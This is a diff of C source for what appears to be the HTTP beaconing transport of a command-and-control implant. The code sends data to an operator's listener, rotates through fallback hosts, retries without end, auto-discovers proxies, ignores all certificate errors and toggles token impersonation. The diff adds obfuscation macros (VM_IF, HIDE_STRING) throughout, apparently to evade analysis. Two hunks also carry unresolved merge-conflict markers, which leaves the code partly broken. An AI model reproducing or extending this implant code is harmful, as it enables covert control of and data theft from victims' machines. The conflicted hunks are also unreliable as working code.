@@ -45,45 +45,61 @@ BOOL HttpSend(
     TokenImpersonate( FALSE );
 
     /* if we don't have any more hosts left, then exit */
-    if ( ! Instance->Config.Transport.Host ) {
-        PUTS_DONT_SEND( "No hosts left to use... exit now." )
+    VM_IF ( ! Instance->Config.Transport.Host ) {
+        PUTS_DONT_SEND( HIDE_STRING("No hosts left to use... exit now.") )
         CommandExit( NULL );
     }
 
-    if ( ! Instance->hHttpSession ) {
-        if ( Instance->Config.Transport.Proxy.Enabled ) {
+    VM_IF ( ! Instance->hHttpSession ) {
+        VM_IF ( Instance->Config.Transport.Proxy.Enabled ) {
             // Use preconfigured proxy
             HttpProxy = Instance->Config.Transport.Proxy.Url;
 
             /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NAMED_PROXY, %ls, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent, HttpProxy ) */
             Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_NAMED_PROXY, HttpProxy, WINHTTP_NO_PROXY_BYPASS, 0 );
-        } else {
+        } VM_ELSE {
             // Autodetect proxy settings
             /* PRINTF_DONT_SEND( "WinHttpOpen( %ls, WINHTTP_ACCESS_TYPE_NO_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 )\n", Instance->Config.Transport.UserAgent ) */
             Instance->hHttpSession = Instance->Win32.WinHttpOpen( Instance->Config.Transport.UserAgent, WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0 );
         }
 
-        if ( ! Instance->hHttpSession ) {
-            PRINTF_DONT_SEND( "WinHttpOpen: Failed => %d\n", NtGetLastError() )
+        VM_IF ( ! Instance->hHttpSession ) {
+            PRINTF_DONT_SEND( HIDE_STRING("WinHttpOpen: Failed => %d\n"), NtGetLastError() )
             goto LEAVE;
         }
+<<<<<<< Updated upstream
+=======
+
+        // Enable all TLS protocols at the session level
+        VM_IF ( Instance->Config.Transport.Secure ) {
+            DWORD protocols = WINHTTP_FLAG_SECURE_PROTOCOL_TLS1   |
+                              WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1 |
+                              WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2 |
+                              WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3;
+
+            VM_IF ( ! Instance->Win32.WinHttpSetOption( Instance->hHttpSession, WINHTTP_OPTION_SECURE_PROTOCOLS, &protocols, sizeof( DWORD ) ) )
+            {
+                PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption Session (PROTOCOLS): Failed => %d\n"), NtGetLastError() );
+            }
+        }
+>>>>>>> Stashed changes
     }
 
     /* PRINTF_DONT_SEND( "WinHttpConnect( %x, %ls, %d, 0 )\n", Instance->hHttpSession, Instance->Config.Transport.Host->Host, Instance->Config.Transport.Host->Port ) */
-    if ( ! ( Connect = Instance->Win32.WinHttpConnect(
+    VM_IF ( ! ( Connect = Instance->Win32.WinHttpConnect(
         Instance->hHttpSession,
         Instance->Config.Transport.Host->Host,
         Instance->Config.Transport.Host->Port,
         0
     ) ) ) {
-        PRINTF_DONT_SEND( "WinHttpConnect: Failed => %d\n", NtGetLastError() )
+        PRINTF_DONT_SEND( HIDE_STRING("WinHttpConnect: Failed => %d\n"), NtGetLastError() )
         goto LEAVE;
     }
 
     while ( TRUE ) {
-        if ( ! Instance->Config.Transport.Uris[ Counter ] ) {
+        VM_IF ( ! Instance->Config.Transport.Uris[ Counter ] ) {
             break;
-        } else {
+        } VM_ELSE {
             Counter++;
         }
     }
@@ -91,12 +107,12 @@ BOOL HttpSend(
     HttpEndpoint = Instance->Config.Transport.Uris[ RandomNumber32() % Counter ];
     HttpFlags    = WINHTTP_FLAG_BYPASS_PROXY_CACHE;
 
-    if ( Instance->Config.Transport.Secure ) {
+    VM_IF ( Instance->Config.Transport.Secure ) {
         HttpFlags |= WINHTTP_FLAG_SECURE;
     }
 
     /* PRINTF_DONT_SEND( "WinHttpOpenRequest( %x, %ls, %ls, NULL, NULL, NULL, %x )\n", hConnect, Instance->Config.Transport.Method, HttpEndpoint, HttpFlags ) */
-    if ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
+    VM_IF ( ! ( Request = Instance->Win32.WinHttpOpenRequest(
         Connect,
         Instance->Config.Transport.Method,
         HttpEndpoint,
@@ -105,31 +121,52 @@ BOOL HttpSend(
         NULL,
         HttpFlags
     ) ) ) {
-        PRINTF_DONT_SEND( "WinHttpOpenRequest: Failed => %d\n", NtGetLastError() )
+        PRINTF_DONT_SEND( HIDE_STRING("WinHttpOpenRequest: Failed => %d\n"), NtGetLastError() )
         goto LEAVE;
     }
 
-    if ( Instance->Config.Transport.Secure ) {
+    VM_IF ( Instance->Config.Transport.Secure ) {
         HttpFlags = SECURITY_FLAG_IGNORE_UNKNOWN_CA        |
                     SECURITY_FLAG_IGNORE_CERT_DATE_INVALID |
                     SECURITY_FLAG_IGNORE_CERT_CN_INVALID   |
                     SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE;
 
-        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
+        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_SECURITY_FLAGS, &HttpFlags, sizeof( DWORD ) ) )
         {
-            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption: Failed => %d\n"), NtGetLastError() );
         }
+<<<<<<< Updated upstream
+=======
+
+        // Enable all TLS protocols - including support for modern certificates
+        DWORD protocols = 0x00000800 | // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1
+                          0x00002000 | // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_1
+                          0x00004000 | // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_2
+                          0x00008000;  // WINHTTP_FLAG_SECURE_PROTOCOL_TLS1_3
+
+        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, 31 /* WINHTTP_OPTION_SECURE_PROTOCOLS */, &protocols, sizeof( DWORD ) ) )
+        {
+            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption (PROTOCOLS): Failed => %d\n"), NtGetLastError() );
+        }
+        
+        // Enable modern cipher suites that support ECDSA and Ed25519 certificates
+        DWORD enableStrongCrypto = 1;
+        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, 105 /* WINHTTP_OPTION_ENABLE_FEATURE */, &enableStrongCrypto, sizeof( DWORD ) ) )
+        {
+            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption (ENABLE_FEATURE): Failed => %d\n"), NtGetLastError() );
+        }
+>>>>>>> Stashed changes
     }
 
     /* Add our headers */
     do {
         HttpHeader = Instance->Config.Transport.Headers[ Iterator ];
 
-        if ( ! HttpHeader )
+        VM_IF ( ! HttpHeader )
             break;
 
-        if ( ! Instance->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
-            PRINTF_DONT_SEND( "Failed to add header: %ls", HttpHeader )
+        VM_IF ( ! Instance->Win32.WinHttpAddRequestHeaders( Request, HttpHeader, -1, WINHTTP_ADDREQ_FLAG_ADD ) ) {
+            PRINTF_DONT_SEND( HIDE_STRING("Failed to add header: %ls"), HttpHeader )
         }
 
         Iterator++;
@@ -141,33 +178,33 @@ BOOL HttpSend(
         ProxyInfo.dwAccessType = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
         ProxyInfo.lpszProxy    = Instance->Config.Transport.Proxy.Url;
 
-        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
-            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, &ProxyInfo, sizeof( WINHTTP_PROXY_INFO ) ) ) {
+            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption: Failed => %d\n"), NtGetLastError() );
         }
 
-        if ( Instance->Config.Transport.Proxy.Username ) {
-            if ( ! Instance->Win32.WinHttpSetOption(
+        VM_IF ( Instance->Config.Transport.Proxy.Username ) {
+            VM_IF ( ! Instance->Win32.WinHttpSetOption(
                 Request,
                 WINHTTP_OPTION_PROXY_USERNAME,
                 Instance->Config.Transport.Proxy.Username,
                 StringLengthW( Instance->Config.Transport.Proxy.Username )
             ) ) {
-                PRINTF_DONT_SEND( "Failed to set proxy username %u", NtGetLastError() );
+                PRINTF_DONT_SEND( HIDE_STRING("Failed to set proxy username %u"), NtGetLastError() );
             }
         }
 
-        if ( Instance->Config.Transport.Proxy.Password ) {
-            if ( ! Instance->Win32.WinHttpSetOption(
+        VM_IF ( Instance->Config.Transport.Proxy.Password ) {
+            VM_IF ( ! Instance->Win32.WinHttpSetOption(
                 Request,
                 WINHTTP_OPTION_PROXY_PASSWORD,
                 Instance->Config.Transport.Proxy.Password,
                 StringLengthW( Instance->Config.Transport.Proxy.Password )
             ) ) {
-                PRINTF_DONT_SEND( "Failed to set proxy password %u", NtGetLastError() );
+                PRINTF_DONT_SEND( HIDE_STRING("Failed to set proxy password %u"), NtGetLastError() );
             }
         }
 
-    } else if ( ! Instance->LookedForProxy ) {
+    } VM_ELSE_IF ( ! Instance->LookedForProxy ) {
         // Autodetect proxy settings using the Web Proxy Auto-Discovery (WPAD) protocol
 
         /*
@@ -184,24 +221,24 @@ BOOL HttpSend(
         AutoProxyOptions.dwReserved             = 0;
         AutoProxyOptions.fAutoLogonIfChallenged = TRUE;
 
-        if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
-            if ( ProxyInfo.lpszProxy ) {
-                PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+        VM_IF ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
+            VM_IF ( ProxyInfo.lpszProxy ) {
+                PRINTF_DONT_SEND( HIDE_STRING("Using proxy %ls\n"), ProxyInfo.lpszProxy );
             }
 
             Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
             Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
             MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
-        } else {
+        } VM_ELSE {
             // WinHttpGetProxyForUrl failed, use WinHttpGetIEProxyConfigForCurrentUser as fall-back
-            if ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
-                if ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
+            VM_IF ( Instance->Win32.WinHttpGetIEProxyConfigForCurrentUser( &ProxyConfig ) ) {
+                VM_IF ( ProxyConfig.lpszProxy != NULL && StringLengthW( ProxyConfig.lpszProxy ) != 0 ) {
                     // IE is set to "use a proxy server"
                     ProxyInfo.dwAccessType    = WINHTTP_ACCESS_TYPE_NAMED_PROXY;
                     ProxyInfo.lpszProxy       = ProxyConfig.lpszProxy;
                     ProxyInfo.lpszProxyBypass = ProxyConfig.lpszProxyBypass;
 
-                    PRINTF_DONT_SEND( "Using IE proxy %ls\n", ProxyInfo.lpszProxy );
+                    PRINTF_DONT_SEND( HIDE_STRING("Using IE proxy %ls\n"), ProxyInfo.lpszProxy );
 
                     Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                     Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
@@ -210,24 +247,24 @@ BOOL HttpSend(
                     // don't cleanup these values
                     ProxyConfig.lpszProxy       = NULL;
                     ProxyConfig.lpszProxyBypass = NULL;
-                } else if ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
+                } VM_ELSE_IF ( ProxyConfig.lpszAutoConfigUrl != NULL && StringLengthW( ProxyConfig.lpszAutoConfigUrl ) != 0 ) {
                     // IE is set to "Use automatic proxy configuration"
                     AutoProxyOptions.dwFlags           = WINHTTP_AUTOPROXY_CONFIG_URL;
                     AutoProxyOptions.lpszAutoConfigUrl = ProxyConfig.lpszAutoConfigUrl;
                     AutoProxyOptions.dwAutoDetectFlags = 0;
 
-                    PRINTF_DONT_SEND( "Trying to discover the proxy config via the config url %ls\n", AutoProxyOptions.lpszAutoConfigUrl );
+                    PRINTF_DONT_SEND( HIDE_STRING("Trying to discover the proxy config via the config url %ls\n"), AutoProxyOptions.lpszAutoConfigUrl );
 
-                    if ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
-                        if ( ProxyInfo.lpszProxy ) {
-                            PRINTF_DONT_SEND( "Using proxy %ls\n", ProxyInfo.lpszProxy );
+                    VM_IF ( Instance->Win32.WinHttpGetProxyForUrl( Instance->hHttpSession, HttpEndpoint, &AutoProxyOptions, &ProxyInfo ) ) {
+                        VM_IF ( ProxyInfo.lpszProxy ) {
+                            PRINTF_DONT_SEND( HIDE_STRING("Using proxy %ls\n"), ProxyInfo.lpszProxy );
                         }
 
                         Instance->SizeOfProxyForUrl = sizeof( WINHTTP_PROXY_INFO );
                         Instance->ProxyForUrl       = Instance->Win32.LocalAlloc( LPTR, Instance->SizeOfProxyForUrl );
                         MemCopy( Instance->ProxyForUrl, &ProxyInfo, Instance->SizeOfProxyForUrl );
                     }
-                } else {
+                } VM_ELSE {
                     // IE is set to "automatically detect settings"
                     // ignore this as we already tried
                 }
@@ -237,23 +274,23 @@ BOOL HttpSend(
         Instance->LookedForProxy = TRUE;
     }
 
-    if ( Instance->ProxyForUrl ) {
-        if ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
-            PRINTF_DONT_SEND( "WinHttpSetOption: Failed => %d\n", NtGetLastError() );
+    VM_IF ( Instance->ProxyForUrl ) {
+        VM_IF ( ! Instance->Win32.WinHttpSetOption( Request, WINHTTP_OPTION_PROXY, Instance->ProxyForUrl, Instance->SizeOfProxyForUrl ) ) {
+            PRINTF_DONT_SEND( HIDE_STRING("WinHttpSetOption: Failed => %d\n"), NtGetLastError() );
         }
     }
 
     /* Send package to our listener */
-    if ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
-        if ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
+    VM_IF ( Instance->Win32.WinHttpSendRequest( Request, NULL, 0, Send->Buffer, Send->Length, Send->Length, 0 ) ) {
+        VM_IF ( Instance->Win32.WinHttpReceiveResponse( Request, NULL ) ) {
             /* Is the server recognizing us ? are we good ?  */
-            if ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
-                PUTS_DONT_SEND( "HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)" )
+            VM_IF ( HttpQueryStatus( Request ) != HTTP_STATUS_OK ) {
+                PUTS_DONT_SEND( HIDE_STRING("HttpQueryStatus Failed: Is not HTTP_STATUS_OK (200)") )
                 Successful = FALSE;
                 goto LEAVE;
             }
 
-            if ( Resp ) {
+            VM_IF ( Resp ) {
                 RespBuffer = NULL;
 
                 //
@@ -261,13 +298,13 @@ BOOL HttpSend(
                 //
                 do {
                     Successful = Instance->Win32.WinHttpReadData( Request, Buffer, sizeof( Buffer ), &BufRead );
-                    if ( ! Successful || BufRead == 0 ) {
+                    VM_IF ( ! Successful || BufRead == 0 ) {
                         break;
                     }
 
-                    if ( ! RespBuffer ) {
+                    VM_IF ( ! RespBuffer ) {
                         RespBuffer = Instance->Win32.LocalAlloc( LPTR, BufRead );
-                    } else {
+                    } VM_ELSE {
                         RespBuffer = Instance->Win32.LocalReAlloc( RespBuffer, RespSize + BufRead, LMEM_MOVEABLE | LMEM_ZEROINIT );
                     }
 
@@ -283,39 +320,39 @@ BOOL HttpSend(
                 Successful = TRUE;
             }
         }
-    } else {
-        if ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
+    } VM_ELSE {
+        VM_IF ( NtGetLastError() == ERROR_INTERNET_CANNOT_CONNECT ) {
             Instance->Session.Connected = FALSE;
         }
 
-        PRINTF_DONT_SEND( "HTTP Error: %d\n", NtGetLastError() )
+        PRINTF_DONT_SEND( HIDE_STRING("HTTP Error: %d\n"), NtGetLastError() )
     }
 
 LEAVE:
-    if ( Connect ) {
+    VM_IF ( Connect ) {
         Instance->Win32.WinHttpCloseHandle( Connect );
     }
 
-    if ( Request ) {
+    VM_IF ( Request ) {
         Instance->Win32.WinHttpCloseHandle( Request );
     }
 
-    if ( ProxyConfig.lpszProxy ) {
+    VM_IF ( ProxyConfig.lpszProxy ) {
         Instance->Win32.GlobalFree( ProxyConfig.lpszProxy );
     }
 
-    if ( ProxyConfig.lpszProxyBypass ) {
+    VM_IF ( ProxyConfig.lpszProxyBypass ) {
         Instance->Win32.GlobalFree( ProxyConfig.lpszProxyBypass );
     }
 
-    if ( ProxyConfig.lpszAutoConfigUrl ) {
+    VM_IF ( ProxyConfig.lpszAutoConfigUrl ) {
         Instance->Win32.GlobalFree( ProxyConfig.lpszAutoConfigUrl );
     }
 
     /* re-impersonate the token */
     TokenImpersonate( TRUE );
 
-    if ( ! Successful ) {
+    VM_IF ( ! Successful ) {
         /* if we hit our max then we use our next host */
         Instance->Config.Transport.Host = HostFailure( Instance->Config.Transport.Host );
     }
@@ -339,7 +376,7 @@ DWORD HttpQueryStatus(
     DWORD StatusCode = 0;
     DWORD StatusSize = sizeof( DWORD );
 
-    if ( Instance->Win32.WinHttpQueryHeaders(
+    VM_IF ( Instance->Win32.WinHttpQueryHeaders(
         Request,
         WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
         WINHTTP_HEADER_NAME_BY_INDEX,
@@ -356,7 +393,7 @@ DWORD HttpQueryStatus(
 PHOST_DATA HostAdd(
     _In_ LPWSTR Host, SIZE_T Size, DWORD Port )
 {
-    PRINTF_DONT_SEND( "Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n", Host, Size, Port );
+    PRINTF_DONT_SEND( HIDE_STRING("Host -> Host:[%ls] Size:[%ld] Port:[%ld]\n"), Host, Size, Port );
 
     PHOST_DATA HostData = NULL;
 
@@ -377,10 +414,10 @@ PHOST_DATA HostAdd(
 
 PHOST_DATA HostFailure( PHOST_DATA Host )
 {
-    if ( ! Host )
+    VM_IF ( ! Host )
         return NULL;
 
-    if ( Host->Failures == Instance->Config.Transport.HostMaxRetries )
+    VM_IF ( Host->Failures == Instance->Config.Transport.HostMaxRetries )
     {
         /* we reached our max failed retries with our current host data
          * use next one */
@@ -393,7 +430,7 @@ PHOST_DATA HostFailure( PHOST_DATA Host )
     /* Increase our failed counter */
     Host->Failures++;
 
-    PRINTF_DONT_SEND( "Host [Host: %ls:%ld] failure counter increased to %d\n", Host->Host, Host->Port, Host->Failures )
+    PRINTF_DONT_SEND( HIDE_STRING("Host [Host: %ls:%ld] failure counter increased to %d\n"), Host->Host, Host->Port, Host->Failures )
 
     return Host;
 }
@@ -409,14 +446,14 @@ PHOST_DATA HostRandom()
 
     for ( ;; )
     {
-        if ( Count == Index )
+        VM_IF ( Count == Index )
             break;
 
-        if ( ! Host )
+        VM_IF ( ! Host )
             break;
 
         /* if we are the end and still didn't found the random index quit. */
-        if ( ! Host->Next )
+        VM_IF ( ! Host->Next )
         {
             Host = NULL;
             break;
@@ -428,8 +465,8 @@ PHOST_DATA HostRandom()
         Host = Host->Next;
     }
 
-    PRINTF_DONT_SEND( "Index: %d\n", Index )
-    PRINTF_DONT_SEND( "Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n", Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )
+    PRINTF_DONT_SEND( HIDE_STRING("Index: %d\n"), Index )
+    PRINTF_DONT_SEND( HIDE_STRING("Host : %p (%ls:%ld :: Dead[%s] :: Failures[%d])\n"), Host, Host->Host, Host->Port, Host->Dead ? "TRUE" : "FALSE", Host->Failures )
 
     return Host;
 }
@@ -438,7 +475,7 @@ PHOST_DATA HostRotation( SHORT Strategy )
 {
     PHOST_DATA Host = NULL;
 
-    if ( Instance->Config.Transport.NumHosts > 1 )
+    VM_IF ( Instance->Config.Transport.NumHosts > 1 )
     {
         /*
          * Different CDNs can have different WPAD rules.
@@ -447,7 +484,7 @@ PHOST_DATA HostRotation( SHORT Strategy )
         Instance->LookedForProxy = FALSE;
     }
 
-    if ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
+    VM_IF ( Strategy == TRANSPORT_HTTP_ROTATION_ROUND_ROBIN )
     {
         DWORD Count = 0;
 
@@ -456,37 +493,37 @@ PHOST_DATA HostRotation( SHORT Strategy )
 
         /* If our current host is empty
          * then return the top host from our linked list. */
-        if ( ! Instance->Config.Transport.Host )
+        VM_IF ( ! Instance->Config.Transport.Host )
             return Host;
 
         for ( Count = 0; Count < HostCount();  )
         {
             /* check if it's not an empty pointer */
-            if ( ! Host )
+            VM_IF ( ! Host )
                 break;
 
             /* if the host is dead (max retries limit reached) then continue */
-            if ( Host->Dead )
+            VM_IF ( Host->Dead )
                 Host = Host->Next;
-            else break;
+            VM_ELSE break;
         }
     }
-    else if ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
+    VM_ELSE_IF ( Strategy == TRANSPORT_HTTP_ROTATION_RANDOM )
     {
         /* Get a random Host */
         Host = HostRandom();
 
         /* if we fail use the first host we get available. */
-        if ( Host->Dead )
+        VM_IF ( Host->Dead )
             /* fallback to Round Robin */
             Host = HostRotation( TRANSPORT_HTTP_ROTATION_ROUND_ROBIN );
     }
 
     /* if we specified infinite retries then reset every "Failed" retries in our linked list and do this forever...
      * as the operator wants. */
-    if ( ( Instance->Config.Transport.HostMaxRetries == 0 ) && ! Host )
+    VM_IF ( ( Instance->Config.Transport.HostMaxRetries == 0 ) && ! Host )
     {
-        PUTS_DONT_SEND( "Specified to keep going. To infinity... and beyond" )
+        PUTS_DONT_SEND( HIDE_STRING("Specified to keep going. To infinity... and beyond") )
 
         /* get linked list */
         Host = Instance->Config.Transport.Hosts;
@@ -494,7 +531,7 @@ PHOST_DATA HostRotation( SHORT Strategy )
         /* iterate over linked list */
         for ( ;; )
         {
-            if ( ! Host )
+            VM_IF ( ! Host )
                 break;
 
             /* reset failures */
@@ -522,7 +559,7 @@ DWORD HostCount()
 
     do {
 
-        if ( ! Host )
+        VM_IF ( ! Host )
             break;
 
         Count++;
@@ -530,7 +567,7 @@ DWORD HostCount()
         Host = Host->Next;
 
         /* if we are at the beginning again then stop. */
-        if ( Head == Host )
+        VM_IF ( Head == Host )
             break;
 
     } while ( TRUE );
@@ -549,21 +586,21 @@ BOOL HostCheckup()
     Host = Head;
 
     do {
-        if ( ! Host )
+        VM_IF ( ! Host )
             break;
 
-        if ( Host->Dead )
+        VM_IF ( Host->Dead )
             Count++;
 
         Host = Host->Next;
 
         /* if we are at the beginning again then stop. */
-        if ( Head == Host )
+        VM_IF ( Head == Host )
             break;
     } while ( TRUE );
 
     /* check if every host is dead */
-    if ( HostCount() == Count )
+    VM_IF ( HostCount() == Count )
         Alive = FALSE;
 
     return Alive;
